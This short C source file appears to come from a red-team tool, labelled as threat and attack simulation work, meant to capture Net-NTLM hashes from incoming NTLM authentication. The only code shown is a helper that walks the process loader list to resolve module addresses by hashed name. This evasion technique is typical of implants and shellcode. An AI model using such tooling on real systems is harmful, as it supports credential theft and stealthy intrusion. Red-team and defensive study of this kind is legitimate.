/**
 *
 * Captures incoming Net-NTLMv1/v2 hashes
 * for incoming authentication attempts 
 * via NTLM.
 *
 * GuidePoint Security LLC
 * Threat and Attack Simulation
 *
**/

#include "common.h"

/**
 *
 * @brief:	Acts as a replacement for GetModuleHandle.
 *
 * @param:	Hash of the module name.
 *
**/

D_SEC( E ) PVOID PebGetModule( _In_ ULONG ModHash )
{
	PPEB			Peb = NULL;
	PLIST_ENTRY		Hdr = NULL;
	PLIST_ENTRY		Ent = NULL;
	PLDR_DATA_TABLE_ENTRY	Ldr = NULL;

	Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
	Hdr = & Peb->Ldr->InLoadOrderModuleList;
	Ent = Hdr->Flink;

	for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
		Ldr = C_PTR( Ent );

		if ( HashString( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length ) == ModHash ) {
			return C_PTR( Ldr->DllBase );
		};
	};
	return NULL;
};
